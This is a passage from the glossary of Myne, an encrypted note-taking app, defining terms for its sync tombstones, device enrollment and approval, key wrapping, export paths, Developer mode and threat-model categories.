The user preference, exposed in Settings → **Files**, controlling where a newly-created note is filed. Two `vault.prefs` fields carry it (`spec/protocol.md` §9.5.2): **`new_note_location`** — a mode of `root` (the vault root, the default), `current` (the same folder as the currently-active note, derived from its `folder:` frontmatter, falling back to root when no note is selected), or `specific` — and **`new_note_location_folder`**, the canonical trailing-slash target folder used only in `specific` mode (also registered as a [deliberate folder](#deliberate-folder) so it survives empty). The preference applies only to the root-level create paths (⌘N, the palette, "+ New Note", a new tab); an explicit folder target (the folder context-menu "New note here") is authoritative and bypasses it. Non-load-bearing. See [decisions.md](decisions.md) 2026-06-27 (MYND-462).

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-27 (MYND-462)

### **deleted field** &nbsp; 📋 *Protocol*

The Myne-managed canonical frontmatter field `deleted:` — a **value-strict** RFC 3339 UTC timestamp marking a note as a **sync deletion tombstone** (the exact twin of `trashed:`; any non-timestamp value leaves the note live). Under sync a delete is rerouted (`src/notes/deleteNote.ts::deleteNoteRouted` → `tombstoneNote` via `patchDeletedField`) to a `deleted: <now>` version the [vault head](#vault-head) commits, so the deletion **propagates** to other devices and cannot be silently resurrected by the blind server; a local-only delete stays the hard cryptographic-erase `unlink`. Excluded from sidebar / folder-tree / search like `trashed:`; GC'd at the [tombstone horizon](#tombstone-horizon). Rides the existing `.myn` AEAD envelope — no `protocol.md` magic-byte / AAD / version change (MYND-426). Phase 2. See [markdown-dialect.md](spec/markdown-dialect.md) §3.6.1.

### **deleted-attachment tombstone** &nbsp; 📦 *Product*

The styleable placeholder an editor embed renders when its [attachment-id](#attachment-id) no longer resolves. Note bodies are **never** rewritten on deletion — the `![[att:<id>|filename]]` reference dangles intentionally and the resolver renders a tombstone, distinguishing a *deleted attachment* (id once existed, removed from the library) from a *broken reference* (id never existed). One shared component across the editor and the attachments library. Consistent with the no-auto-GC, explicit-delete-only attachment lifecycle. **Distinct from** the [attachment catalog tombstone](#attachment-catalog-tombstone), which is the *synced catalog-entry deletion marker* (Phase 2), not a UI element. (MYND-164)

### **deliberate folder** &nbsp; 📦 *Product*

A folder the user means to keep, which persists in the sidebar tree even when it holds no note. Because the virtual-folder model derives folders from each note's `folder:` frontmatter, an empty folder has no note to carry it; deliberate folders are therefore persisted as a set (the top-level `deliberate_folders` array) inside the encrypted `vault.prefs` (`spec/protocol.md` §9.5.2). A folder that exists only because notes carry its path is *implicit* and vanishes when its last note leaves; a deliberate folder survives. Identity is case-fold + NFC (`spec/markdown-dialect.md` §3.6.2).

**Revised by myne-md/myne#613, in both halves.** The set used to be *cold*, written on explicit folder create and delete alone, which meant a folder made by dragging a note into a new name was never recorded and vanished the moment it was emptied. It is now written by [at-fill registration](#at-fill-registration) as well, and bounded by a [set-field byte budget](#set-field-byte-budget). And it used to merge as a clockless add-wins union, under which a folder delete could never reach a second device; it now carries per-entry removal clocks (`spec/sync-protocol.md` §10.2). The two egress-control sets that share its codec, [AI-excluded folder](#ai-excluded-folder) and [CLI-excluded folder](#cli-excluded-folder), deliberately kept the clockless union. See also [folder](#folder), [item order](#item-order).

Used in: `spec/protocol.md` §9.5.2, `spec/markdown-dialect.md` §3.6.2, `spec/sync-protocol.md` §10.2; `decisions.md` 2026-05-29, myne-md/myne#613

### **detached note window (pop-out window)** &nbsp; 📦 *Product*

A single note opened in its own OS-level window (a "pop-out"), for the second-monitor case, alongside the in-window split panes. Desktop client only: the web (single-tab OPFS lock) and mobile clients cannot spawn OS windows, so the affordance is absent there. The window is host-spawned (page context holds no window-create grant), labelled `note-<id>` (SYNC-1), and carries a narrow per-webview capability set (read-only prefs, no `prefs:allow-set-*`, per `decisions.md` clients/0136). A second WebView holding decrypted plaintext is a new trust-boundary surface, so it tears down on every vault lock (hide-then-destroy) and applies the same screen-capture protection as the main window (`threat-model.md` §7). SYNC-6, one note one surface: popping a note out MOVES it, so the source tab closes and re-opening the note reveals the pop-out rather than duplicating it (which would give the note two autosaving surfaces over one blob). Its geometry is persisted device-local in the `MYW1` workspace blob for restore, never synced.

Used in: `threat-model.md` §7; `decisions.md` 2026-09-06 (clients/0578, clients/0579); myne-md/myne#173 (#677 to #681)

### **Developer mode** &nbsp; 📦 *Product*

A Settings toggle (`developer_mode` pref, `bool`, default `false`, additive `vault.prefs` (`MYP1`) field, [device-local pref](#device-local-pref) — every setting it gates is itself device-local, so the gate is too) gating the settings where **the user leaves the path Myne vouches for**, plus the power-user affordances kept out of the default surface for the same reason of restraint. Membership today: [local inference](#local-inference) — the generation and embedding pickers (no bundled model — the picker *is* the untrusted-input setup) and the transcription-model **override** (the bundled Whisper model itself stays ungated and reachable from ordinary Settings, since Myne vouches for that first-party asset — MYND-270); the device-local [Tor routing mode](#tor-routing-mode) switch (MYND-650); [CLI terminal access](#cli-terminal-access) (myne-md/myne#181 — the clearest case, since the block opens an unlocked vault to an external process over a local socket); and **vim keyboard mode** (the same change; a power-user editing mode rather than a trust-boundary widening). Replaces the earlier "Settings → Labs" surface and its per-panel Beta badge, folding the AI panel into a Developer group instead (`decisions.md` 2026-07-30, superseding the Labs/Beta-surface framing of `decisions.md` 2026-07-02). Toggled from Settings → About, beside the build-channel/licence/threat-model links it suspends; the toggle renders on every client (`decisions.md` 2026-08-01 — withholding it where the rail group would be empty stranded the members that ship everywhere). Enabling and disabling both take effect immediately, with no restart and no confirmation dialog either way. Turning it off is **non-destructive**, and uniformly so: it hides controls, it never disables features — the AI opt-in, any model-path override, an open command socket and an active vim keymap all survive unchanged, each turned off only by its own control.

**Shipped today:** the pref itself, and gating of three frontend doors while the mode is off — the Settings rail (no Developer row), settings search (the gated entries drop out of the index), and the command palette (the five AI actions and the vim toggle drop out of the registry). The gate works at two granularities: whole rail **panels** are filtered out of the array (AI, Network), while **individual settings** in panels that stay visible are hidden by a panel-internal render condition (the CLI block in Privacy, the vim row in Editor) — the second shape is what a "Developer tools" panel would have cost each setting its topical home to express. **Designed but not yet shipped:** a host-side enforcement of the same boundary — the AI opt-in becoming effectively `developer_mode && ai_enabled` for every consumer of that predicate, the transcription resolver falling through to the bundled model while the mode is off even with an override marker present, and the model-path setter rejecting writes for all three roles while the mode is off. That half is blocked on **MYND-592** (giving transcription its own preference, decoupled from the AI opt-in) and is tracked as the developer-mode feature's (MYND-593) remaining tasks. Until MYND-592 lands, Developer mode is a **UI-discovery gate, not a host-enforced one**: a WebView that already has `ai_enabled` set gains nothing new from the mode being off. See `threat-model.md` §7 "Local AI".

Used in: `spec/protocol.md` §9.5.2 (field), `spec/sync-protocol.md` §10.2 (classification); `decisions.md` 2026-07-30

### **device-class refusal** &nbsp; 📦 *Product*

The Phase 3 web client's refusal to run on a phone or tablet, decided before anything mounts and rendered as the [unsupported-environment](#web-capability-set) screen with its own heading. Distinct from the capability refusals it shares that screen with: those name a browser API that is missing, this one names the *device*, because a modern mobile browser has every API the client needs and is still the wrong place to run it — a `WebAssembly.Memory` reservation is virtual, so the 336 MiB KDF probe succeeds on hardware that then dies part-way through Argon2id. Decided from **form-factor signals**, never a user-agent string and never a viewport width: `navigator.userAgentData.mobile`, the `(pointer: coarse) and (hover: none)` primary-input media query, and `navigator.maxTouchPoints` on a Mac platform (the iPad-with-a-trackpad case). Width is excluded deliberately — a desktop window snapped to a quarter of the screen is ~400 px wide and supported. Hard: there is no continue-anyway, because the failure it prevents happens after the user has typed their password. See also [web capability set](#web-capability-set), [cross-origin isolation](#cross-origin-isolation).

Used in: `decisions.md` 2026-07-29; `web/src/environment-gate.ts`

### **DEM (Data Encapsulation Mechanism)** &nbsp; 🏗️ *Construction*

The symmetric-encryption layer in a hybrid encryption scheme — pairs with a KEM. Myne does not use KEM-DEM in v0.1 (no asymmetric encryption); referenced in a later version's roadmap for sharing operations.

Used in: `spec/protocol.md` §11 (out of scope for v0.1)

### **derive_key pattern** &nbsp; 📋 *Protocol* (deep entry)

Myne's mandated single-helper pattern for subkey derivation. All HKDF-Expand calls in the protocol go through one canonical function — `DeriveSubkey(rootKey, role) → 32 bytes` — which constructs `info = "myne.v0.1 " || role` from the registered role table (§3.4). Direct calls to HKDF-Expand outside this helper are forbidden by code review. The pattern recovers the API-level safety of BLAKE3's `derive_key` (where context is a first-class argument) while keeping HKDF-SHA-256 as the underlying primitive for libsodium and MLS alignment. Without this helper rule, HKDF's historical misuse mode (malformed or empty `info` parameters) would re-emerge.

Used in: `spec/protocol.md` §3.2.1

### **device-approval gate** &nbsp; 📋 *Protocol*

The server authorization step that admits a newly-enrolled device onto an account, **separate from** the SCRAM proof of account ownership (`spec/server-protocol.md` §3.1). The **first** device on an account and any **recovery-path** device **self-approve** (the bootstrap exception — the 24-word phrase already grants full account takeover); a new **password-path** device lands **pending** and syncs nothing until an already-approved device calls `/auth/devices/approve` for it (SYNC-9). It gates *enrollment*, not *authentication* — a pending device has proved the password but is not yet trusted to sync. Distinct from the [bootstrap-fingerprint](#bootstrap-fingerprint) eye-compare (which hardens the approval moment against a malicious server) and from the [per-device token](#per-device-token) (issued once the gate opens). Phase 2.

Used in: `spec/server-protocol.md` §3.1, §4 (MYND-425)

### **device-join QR** &nbsp; 📋 *Protocol*

A QR the trusted desktop displays and a phone scans to add itself to an account (MYND-466), in place of manually typing the [account_number](#account_number). A scanner-only, versioned (`MYQR`) frame carrying only non-secret material (`{server_url, account#, generated_at}`) and **never** a password or recovery phrase (SYNC-47). The wire format keeps a fourth slot that held a cert pin; it is emitted empty since `decisions/sync/0620` and still decoded, so a QR an older desktop produced reads. Ephemeral (≈3-min TTL) to enforce live co-presence. The scan is the out-of-band channel for the [device-approval gate](#device-approval-gate)'s [bootstrap-fingerprint](#bootstrap-fingerprint) SAS, which runs post-approval; it says nothing about the server's certificate, which every client verifies against public CA roots ([in-transit encryption](#in-transit-encryption)). The account number is supplied by a one-time user paste on the desktop (it is a bearer token, [AS9](#account_number), never persisted at rest; `spec/account-number.md` §8). `MYQR` lives outside the `protocol` crate (no ciphertext → not a major-version event). iOS-only for v1 (Android: MYND-465).

Used in: `decisions.md` 2026-07-19; `threat-model.md` §7

### **device key** &nbsp; 🗝️ *Key/identifier*

Reserved term for a later major version's multi-device support: a per-device asymmetric key pair stored in hardware (Secure Enclave / TPM / Android Keystore) that participates in MLS group formation. **Not used in v0.1** — single-device protocol does not need device keys.

Used in: `spec/protocol.md` §11 (out of scope for v0.1)

### **device_id (VV-actor)** &nbsp; 🗝️ *Key/identifier*

The permanent, client-generated 16-byte random identifier of a device as it appears in a [vault head](#vault-head)'s [version vector](#version-vector-vv). Allocated once at enrollment, registered in the per-account device table (**AS16**), and **kept separate from** the device's secret per-device token/credential: the token is revocable/rotatable (an availability control), whereas `device_id` is permanent *history* — deriving the id from the token would let a revocation rewrite version-vector history and break [fork-consistency](#fork-consistency) continuity. Its legitimacy is **not** separately authenticated and need not be: single-user → all devices share `root_key` → the shared-key head MAC is the actor-set authority, and a malicious server (lacking `root_key`) cannot inject a phantom `device_id`. A reset/re-enrolled device generates a **new** `device_id` (the old one's VV component freezes — never pruned in v1). Phase 2.

Used in: `spec/sync-protocol.md` (vault head, version vector)

### **device name** &nbsp; 📦 *Product*

The human-readable label the device list shows for one enrolled device — "Studio Mac", "Travel Laptop" — as opposed to its opaque [device_id](#device_id-vv-actor). Lives **only** in the `device_names` map inside the AEAD-sealed [vault.prefs](#vaultprefs) (`spec/protocol.md` §9.5.2), keyed by the `device_id` hex: it is a [shared pref](#shared-pref) that merges **per key** by union, each entry racing on its own `device_names/<key>` clock (`spec/sync-protocol.md` §10.2). Set at enrollment from an editable field pre-filled with a platform word, and changeable afterwards from **any** device. Three properties are load-bearing and easy to get wrong: it is **never sent to the server in plaintext** — no name field exists in the enrollment request or the device roster (TB5); it travels only inside the AEAD-sealed `MYP1` blob, a **pending** device's name is never shown to the approving device (a label beside an unverified device would read as a trust signal and weaken the [bootstrap-fingerprint](#bootstrap-fingerprint) compare), and there is **no delete** — union merge cannot propagate a removed key, so a name can only ever be replaced. Distinct from the vault `label` (which names a *vault*, not a device). Phase 2.

Used in: `spec/protocol.md` §9.5.2; `spec/sync-protocol.md` §10.2; `decisions.md` 2026-07-25 (MYND-548)

### **device registry** &nbsp; 📦 *Product*

The Phase 2 server's per-account table of enrolled devices, the server-side record that makes **revocation** possible (AS16 — device count per account is server-visible by necessity). Keyed by the client-generated [device_id](#device_id-vv-actor) (the VV-actor), **distinct from** the secret per-device token. Revocation in v0.1 = token iptal (an **availability** control — it stops a device syncing; it is not forward-secret, which is a later-version/MLS feature, `threat-model.md` §7). The device-approval gate that admits a new enrollment is a server authz concern (the ceremony is MYND-425). Phase 2.

Used in: `spec/server-protocol.md` §4; `threat-model.md` AS16

### **device-local credential** &nbsp; 🗝️ *Key/identifier*

A credential that lives only on one device and is **never synchronized**, because it is bound to that device's hardware. The v0.1 instance is the [quick-unlock credential](#quick-unlock-credential) blob (`vault.quickunlock`, `spec/protocol.md` §9.14): its wrap key is held in the OS keychain with `thisDeviceOnly` accessibility, so a copy on another device is inert. Contrast the master-password and recovery-phrase credentials, which are device-portable and ride in the synced `vault.meta`. Each device that opts into quick-unlock mints its own device-local credential.

Used in: `spec/protocol.md` §9.14, `decisions.md` 2026-06-16

### **device-local pref** &nbsp; 📋 *Protocol*

One of the two normative [vault.prefs](#vaultprefs) field classes of the Phase 2 prefs sync (`sync-protocol.md` §10.2, MYND-478): a preference that describes how *this device* presents, secures, or operates on the vault — security posture (`auto_lock_seconds`, `screen_capture_protection`), presentation (`theme`, the `editor_*` fields), input (`keymap`), screen-dependent UI layout, and device state (`last_backup_at`, `paired_extensions`). A device-local pref never crosses the merge — the local value always survives — even though the whole encrypted blob transits the server (the same bytes already leave the device inside backups). Contrast [shared pref](#shared-pref). Not to be confused with a [device-local credential](#device-local-credential), which is a *key-material* class.

Used in: `sync-protocol.md` §10.2; `decisions.md` 2026-07-13

### **Documentation node** &nbsp; 📦 *Product*

The generated page every surface in the design-system catalogue carries (myne-md/myne#847): an overview from the surface's description, its states from the sibling story leaves, and accessibility from the declared level plus the measured facts, with an optional authored block for the two items no generator can produce (when not to use this, and content guidance). The generated half is required and the authored half is optional, because a filler "never" is worse than an absent note. It renders as an inspector tab rather than a rail row, because hoisting a single-state surface to one row leaves no parent row for a Documentation child to hang from. The page states which items are generated and which are authored, so a reader knows what they are trusting. Contrast [subcomponent edge](#subcomponent-edge) and [review axis](#review-axis).

Used in: `stories/README.md`; `decisions/ui/0653`

### **domain separation** &nbsp; 📋 *Protocol*

The cryptographic principle that contexts which should not produce equal outputs from equal inputs MUST mix in a context-distinguishing string. Myne applies it pervasively: HKDF context strings (§3.2), AAD prefixes (§5.2), KDF-parameter binding (§4.3), and protocol-version magic bytes (§9, §10). Failure to domain-separate is the root cause of many published protocol vulnerabilities.

Used in: `spec/protocol.md` §3.2, §5.2

### **done field** &nbsp; 📋 *Protocol*

The Myne-managed canonical frontmatter field `done:` — a **value-strict** RFC 3339 UTC timestamp recording when a [note-task](#note-task) was completed (the exact twin of the `trashed:` / `archived:` / `deleted:` trio; any non-timestamp value leaves the note incomplete). The twelfth managed field (`spec/markdown-dialect.md` §3.6.1).

**Quoting does not demote it.** The scalar is unquoted before the date check, matching the §3.6.4 asymmetry in which quoting demotes checkbox and number values but never dates — so the strict reader and the derived property index agree on `done: "2026-…Z"`. A divergence would mean a note reading complete on one surface and incomplete on another.

Written only by the complete / un-complete orchestrators (`src/notes/completeNote.ts`) via `patchDoneField` over the existing `note_update` IPC — never by body autosave, and neither transition bumps `updated:` (flipping a managed flag is not a content edit). Un-completion **deletes** the field; a note never carries `done: false`. **Orthogonal to the location markers**: a task may be done and archived, or done and trashed — unlike archive ⊥ trash, which are two positions on one location axis. Rides the existing `.myn` AEAD envelope — no magic-byte / AAD / version change (MYND-613).

Used in: `spec/markdown-dialect.md` §3.6.1; `decisions.md` 2026-07-28

### **double-buffered blob** &nbsp; 📋 *Protocol* (*Myne-divergent*)

The web client's on-disk representation of a **singleton** vault blob (`vault.meta`, `vault.prefs`, `vault.search`, `vault.indices`, `vault.themes`, …): two alternating files, `.a` and `.b`, each carrying a sequence number, of which the newest copy that passes AEAD verification is the live one. It replaces the desktop's temp-file-plus-atomic-rename durability construction, which has **no correct implementation on OPFS** — the format offers no crash-atomicity guarantee, and Safari does not implement `move()` at all (measured in the Phase 0 spike). Double buffering needs only "never write both copies at once"; the blob's existing AEAD tag already rejects a torn file, so no checksum or format change is added. The **blob bytes are unchanged** — this is the container around them, not the format. Per-note blobs are not double-buffered; they use write-new-then-remove-old.

Used in: `decisions.md` 2026-07-26 (OPFS container layout)

### **downgrade attack** &nbsp; ⚠️ *Threat*

An attack where the adversary forces the use of a weaker protocol version, KDF parameter set, or cipher suite than the one the parties would otherwise negotiate. Myne structurally prevents downgrade by binding the protocol version, KDF parameters, and AAD prefix into every AEAD tag — any tampering fails verification (`spec/protocol.md` §5.2, §10.5). The forward-incompatible major-version model adds a second layer: cross-major substitution fails because magic bytes and AAD prefixes differ.

Used in: `spec/protocol.md` §10.5

### **dual-credential wrap** &nbsp; 🏗️ *Construction* (deep entry, *Myne-divergent*)

Myne's pattern for unlocking the vault under either of two independent credentials. The 32-byte random `root_key` is wrapped under two keys: `password_wrap_key` (Argon2id of the master password) and `recovery_wrap_key` (Argon2id of the BIP-39 phrase). Both encrypted copies — `enc_root_key_password` and `enc_root_key_recovery` — live in `vault.meta` (§9.3). Either credential alone reconstructs the root_key; both must be lost to render the vault unrecoverable. The architecture cleanly extends to a third wrap (e.g., a hardware-backed WebAuthn-PRF unlock) in a later major version.

Used in: `spec/protocol.md` §3.1, §9.3

### **due-date chip** &nbsp; 📦 *Product*

The inline rendering of a task line's `due` field as a compact pill (MYND-614). One of three task-field chips, with the [recurrence chip](#recurrence-chip) and the priority chip; all three share one token module so the editor's chips and the task panel's rows cannot drift.

**It never opens on caret entry** — the [cursor-aware reveal](#cursor-aware-reveal) exception it shares with wikilink chips — so the chip's own editor is the only way to change the value in live mode, which is why that editor is fully keyboard-operable. It **does** open while the find panel is open. A value that does not parse renders as raw source text with a subtle hint instead of a chip: never a blank chip, never a silently corrected date.

Editing any field on the line rewrites **every** task field on it into Myne's form, in one transaction, so a single undo restores the prior state.

Used in: `spec/markdown-dialect.md` §3.8; `decisions.md` 2026-07-28

### **drawing note** &nbsp; 📦 *Product*

A note whose editing surface is an **Excalidraw canvas** instead of the CodeMirror markdown editor. Stored as an ordinary `.myn` note carrying a value-strict `kind: drawing` frontmatter marker (the 7th Myne-managed canonical field, [`spec/markdown-dialect.md`](spec/markdown-dialect.md) §3.6.1) with the Excalidraw scene serialized into a ` ```excalidraw ` fenced body — so it rides the existing `MY01` envelope with **no protocol change**, syncs/exports like any note, and its text elements are searchable (projected to plain text). Embedded raster images are externalized to attachments (`MYA1`), referenced by a superset `![[att:<id>]]` block so the fail-closed GC never erases a live image. Powered by the vendored, egress-hardened Excalidraw engine (`decisions.md` 2026-07-14). Epic MYND-497.

### **Ed25519** &nbsp; 🔐 *Primitive*

The EdDSA signature scheme over the twisted Edwards form of Curve25519 (RFC 8032). Not used by Myne's at-rest cryptography in v0.1. It is what **minisign** signs release hash lists with, so it is in use on the `TB7` channel today (`threat-model.md` §3 TB7): over the `SHA256SUMS` file, not over any installer, and checked by the user rather than by an operating system. Also reserved for a later version's multi-device identity.

Used in: `threat-model.md` §3 TB7
Reference: RFC 8032.

### **edit anchor** &nbsp; 📦 *Product*

The exact existing text a [proposed edit](#proposed-edit) copied out of a note, used to place its replacement. The host requires it to occur **exactly once**; zero occurrences and more than one are separate named refusals, and neither is ever resolved by placing the replacement somewhere plausible. There is no fuzzy matching, no nearest-match fallback and no whitespace-tolerant retry: each of those converts a visible refusal into a silent misapplication, which is the single failure class the format exists to prevent. Because an anchor is content-addressed rather than an offset, an edit whose note changed between the model reading it and the user approving simply does not match, which is the whole of the sync-race answer.

Used in: `decisions.md` 2026-08-16

### **editor typography** &nbsp; 📦 *Product*

The user-tunable presets for the editor's reading surface: **text size** (`sm`/`md`/`lg`/`xl`), **line spacing** (`tight`/`normal`/`relaxed`), **content width** (`narrow`/`normal`/`wide`/`full`), and **font** (`mono`/`sans`). Each is a closed enum stored as a free string in the four `editor_*` fields of the encrypted `vault.prefs` (`spec/protocol.md` §9.5.2); the client is the single authority mapping a preset to a concrete CSS value and mapping a `null`/unknown value to that field's canonical default (`md` / `normal` / `normal` / `mono`). Cosmetic and **non-load-bearing** (AS-low) — a tampered value can at worst change how the text renders. Applied live in the editor via CSS custom properties (no remount); the heading sizes are `em`-relative so they scale with the base text size. Configured in Settings → Editor. See also [vault.prefs](#vaultprefs).

Used in: `spec/protocol.md` §9.5.2

### **effect half** &nbsp; ⚠️ *Threat*

The half of a security finding that is **what a third party does with the bytes**: whether a provider's front end accepts an injected HTTP header line, whether a peer honours a tombstone for a version it already replaced, whether a browser tab survives a 64 MiB response. It is not observable from this repository, and a finding whose effect half is open cannot be promoted past `needs_validation` no matter how well its source half is closed.

The counterpart is the [source half](#source-half), and the split is what keeps a source-only audit from claiming an outcome it did not measure.

Used in: `docs/dev/audit-nv-verdicts.md`; `design-notes/security/0614-unfixed-security-findings-ship-as-ignored-invariant-tests.md`

### **ex command** &nbsp; 📦 *Product*

A `:`-prefixed command line in [vim mode](#vim-mode). In Myne it is a **closed dispatch table**, not an interpreter: `:w`/`:x`/`:wq` flush the pending autosave (Myne saves invisibly, so "write" means "persist now"), `:q` closes the note tab, and `:s`/`:%s` substitutes. Commands a vim user is likely to try but Myne deliberately does not implement — `:set`, `:map`/`:nmap`/`:imap`/`:vmap`, `:source`, `:!`, `:e` — are registered **only so they refuse with a message**, never silently. The governing boundary: **no ex command may persist a behaviour definition**, which is what keeps the `:` line from becoming the `.vimrc`-style config-script surface Myne rejects (`decisions.md` 2026-07-25) — the same anti-scripting posture as the [template engine](#template-engine)'s insert-never-evaluate rule. Substitution refuses vim-only regex syntax (`\v`, `\zs`, `\(…\)`, `\1` back-references) rather than translating it: a mistranslation would rewrite the user's note silently, so the failure mode is "not supported", never "we changed something else". Introduced MYND-313. See also [vim mode](#vim-mode), [vim register](#vim-register).

### **enc_item_key** &nbsp; 🗝️ *Key/identifier*

The on-disk wrapped form of a per-note `item_key`. Layout per `spec/protocol.md` §9.2: 32 bytes of XChaCha20-Poly1305 ciphertext over the random `item_key`, followed by the 32-byte CTX commitment tag. Encrypted under the singleton `itemsKey` with `item_key_nonce`.

Used in: `spec/protocol.md` §9.2

### **enc_items_key** &nbsp; 🗝️ *Key/identifier*

The on-disk wrapped form of the singleton `itemsKey`, stored in `vault.meta`. 32 bytes of XChaCha20-Poly1305 ciphertext over the `itemsKey` plus the 32-byte CTX tag, encrypted under `itemsKey_wrap_key`.

Used in: `spec/protocol.md` §9.3

### **enc_root_key_password / enc_root_key_recovery** &nbsp; 🗝️ *Key/identifier*

The two on-disk wrapped copies of `root_key` in `vault.meta`. Each is 32 bytes of XChaCha20-Poly1305 ciphertext over `root_key` plus a 32-byte CTX commitment tag. Encrypted respectively under `password_wrap_key` and `recovery_wrap_key`. The dual-credential wrap pattern requires both to exist at vault creation.

Used in: `spec/protocol.md` §3.1, §9.3

### **effective ceiling** &nbsp; 📋 *Protocol*

The storage or device limit a server would actually enforce for one account: the per-account override from the [account policy store](#account-policy-store) when set, else the global default (`quota_override ?? plan ?? global default`; `decisions.md` 2026-07-13). Load-bearing rule: the [account status endpoint](#account-status-endpoint) and the push/enroll enforcement guard MUST resolve it through the **same** function, so a reported ceiling and a refusal cannot disagree. **`0` means unlimited**, never a ceiling of zero — the ordinary self-host posture, which clients render as usage with no limit, no meter and no upsell (`spec/server-protocol.md` §7.1; MYND-570).

Used in: `spec/server-protocol.md` §7.1; `decisions.md` 2026-07-13, 2026-07-26

### **example vault** &nbsp; 📦 *Product*

The small set of ordinary notes seeded into a freshly-created vault on first run (#393), replacing the single welcome note on desktop. Five `.myn` notes under one `Getting started/` folder, with an index note auto-opened via the workspace pre-seed; each note demonstrates a shipped feature by using it — [wikilinks](#wikilink) and backlinks, a [line-task](#line-task) list with a due date, `#tags`, and the Markdown the editor renders. Defining property: it is removable in **one action** — every note is under the one folder, so a single folder-delete soft-trashes the whole set (recoverable from Trash), which is what makes a richer starter set acceptable where a scattered one would not be. The notes are ordinary throughout (editable, renamable, deletable, no read-only, no special-casing) and cross-link by title through interpolation placeholders the seeder fills with the resolved titles, so no link breaks in any locale. Seeded once, on the create→unlock path only, never re-created on a later unlock, never synced as a special case. Mobile still seeds the single welcome note until its companion change lands.

Used in: `decisions.md` 2026-08-08 (first-run example vault)

### **export** &nbsp; 📦 *Product*

A one-shot, user-initiated operation that decrypts user content and writes it as ordinary **unencrypted** files: per-note markdown, the whole-vault markdown tree, attachment files, a rendered PDF, standalone HTML, or stripped plain text (HTML + plain text added by MYND-340). Export is the portability path ("you walk away with your files", `vision.md`): the markdown forms write the stored plaintext **verbatim** (frontmatter included; the only sanctioned mutation is the attachments-mode embed rewrite, `markdown-dialect.md` §6 — HTML's image-sidecar `src` rewrite is the same sanctioned-transform class). PDF/HTML/plain-text are **lossy projections**, not byte-stable round-trips of the source. Terminology wall: an export is never a [vault backup file](#vault-backup-file) (that stays exactly as encrypted as the vault) and never a snapshot (version history). **Where the destination comes from is client-specific, and TB3's authority argument rests on it.** On desktop and on the web the user explicitly chooses it via the OS file dialog. **On mobile there is no dialog and no choice**: neither platform offers the WebView one, so the app picks its own `Documents` directory for every plaintext writer, and what the user authorizes there is the export, not where it lands (myne-md/myne#491). That directory is declared excluded from [platform backup](#platform-backup). Threat-model framing: a deliberate plaintext crossing of TB3 under user authority, and the artifact is outside Myne's protection from the moment it is written (`threat-model.md` §3 TB3, §5). There is no plaintext *mode*: no watch, mirror, or export-on-save exists.

Used in: `threat-model.md` §3/§5, `markdown-dialect.md` §6, `decisions.md` 2026-06-11 (export suite), 2026-08-15 (mobile export directory excluded from platform backup)

### **export chokepoint** &nbsp; 📦 *Product*

The single host command every mobile plaintext [export](#export) asks for its destination,
`plugin:export-dir|export_path` (`mobile/src-tauri/src/plugins/export_dir/`, myne-md/myne#517). It
resolves the export directory, creates it, applies the [platform backup](#platform-backup) exclusion
and sanitizes the supplied filename to a bare basename, in one call, and returns a path only when all
four succeeded. Before it, four flows each composed `join(await documentDir(), name)` in the WebView
and relied on a startup hook having excluded that directory, with the path-traversal sanitizer
hand-rolled in two of the four and absent from the other two.

**What it does not do**, because the name invites the stronger reading: it is not a containment
boundary. The three export commands still take a caller-supplied path string, and a literal absolute
path needs no `plugin:path` grant, so the mobile capability dropping the whole `core:path:` namespace
does not close that route; the note PDF does not go through a command at all. Containment stays with
the writers, which is where `threat-model.md` TB3's plaintext-egress exception already puts
it. (This read `TB6` until review round 6. TB6 is server persistent storage; §3 defines no
WebView-to-host boundary row, so the old citation pointed at a boundary the model does not have.) What the chokepoint gives is the
only way to obtain an export directory guaranteed to exist and to be excluded, and one place where
the ordering (create, then exclude, then hand over) is asserted by a test rather than described by a
comment. Structurally the twin of the [prefs chokepoint](#prefs-chokepoint): one function every write
of a kind must pass through, with a guard holding the tree to it
(`scripts/check-mobile-export-backup.mjs`).

Used in: `decisions.md` 2026-09-19; `threat-model.md` §3 (TB3); `mobile/src/platform/path.ts`; `mobile/src-tauri/src/plugins/export_dir/`

### **extended retention** &nbsp; 📦 *Product*

A **self-host-only** operator flag (`MYNE_EXTENDED_RETENTION`) that disables the server's Layer-2 ciphertext reclamation, so deleted blobs are kept past the [tombstone horizon](#tombstone-horizon). A documented, deliberate **policy deviation**, never a default: it **weakens the user's "delete means gone" expectation** and the §6 operator obligation not to retain deleted ciphertext past the horizon. Hosted MUST NOT enable it. The structural guarantees (no plaintext, no required IP log) are unaffected — extended retention trades a retention-policy obligation, not a confidentiality guarantee. Phase 2.

Used in: `self-host-policy.md` §4, `server-protocol.md` §6, `decisions.md` 2026-06-20 (MYND-438/440)

### **extension host permissions** &nbsp; ⚠️ *Threat*

The access a browser grants an installed extension over a given origin. An extension holding them reads that origin's DOM and input events directly, which for the web client means the recovery-phrase grid, the recovery cells and the master-password field. Adversary class A19, graded ❌ Out of scope because there is no control to apply: a content-security policy governs what the *page* may load, not what an extension may read out of it, and the page cannot detect the extension at all. Distinct from A14, which is about Myne's own keyless clipper extension being compromised.

Used in: `threat-model.md` §1 (A19), §5

### **extension pairing token** &nbsp; 🗝️ *Key/identifier*

A scoped, revocable, **append-only** credential (create-clip + is-unlocked-status only — never a vault key) issued to the [browser clipper](#browser-clipper) after an in-app Accept/Reject + numeric-challenge handshake bound to the exact extension ID. Crossing [TB10](#native-messaging-host) requires it; a compromised token cannot read, modify, or delete notes. The short numeric code compared during this handshake is the **pairing challenge** (a.k.a. numeric challenge): a 6-digit nonce drawn from the core CSPRNG, shown identically in the in-app pairing dialog and the extension so the user confirms both endpoints share one pairing attempt — a human-comparison value, never a key. The registry of issued/revoked tokens persists encrypted at rest in the [vault.prefs](#vaultprefs) prefs-family blob (`decisions.md` 2026-06-20) so pairing survives a restart and revocation is durable.

### **extractor version** &nbsp; 📋 *Protocol*

The 1-byte generation tag (`extractor_version`) on an [`MYE1`](#mye1) extracted-text blob (`spec/protocol.md` §9.15.1), distinct from `protocol_version`: it identifies which [attachment text extraction](#attachment-text-extraction) generation produced the cached text. Because an [attachment-id](#attachment-id) is content-addressed (the bytes are immutable), cached text never needs re-extraction at a fixed `extractor_version`; a **bump** — a better extractor, the audio-ASR generation (`0x02`), or the image-OCR generation (`0x03`, MYND-441) — invalidates older blobs and forces lazy re-extraction plus a search-index [rebuild](#fall-to-rebuild) (the index records the version it was built under, §9.6.4). Bound into the blob AAD as well as the header byte so a tampered header cannot be silently accepted.

